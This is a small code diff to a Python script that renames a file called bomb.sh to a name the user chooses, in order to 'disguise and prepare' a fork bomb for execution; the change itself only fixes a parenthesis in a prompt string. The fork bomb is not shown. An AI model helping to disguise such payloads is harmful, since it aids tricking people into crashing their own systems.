@@ -3,7 +3,7 @@ import os
 
 fbomb_name = "./bomb.sh"
 print("Disguise and prepare fork bomb for execution.")
-new_name = input("Please enter a new filename (including extension") # you can make weirdly named files like this
+new_name = input("Please enter a new filename including extension") # you can make weirdly named files like this
 if new_name:
     print("renaming...")
     os.rename(fbomb_name, new_name)
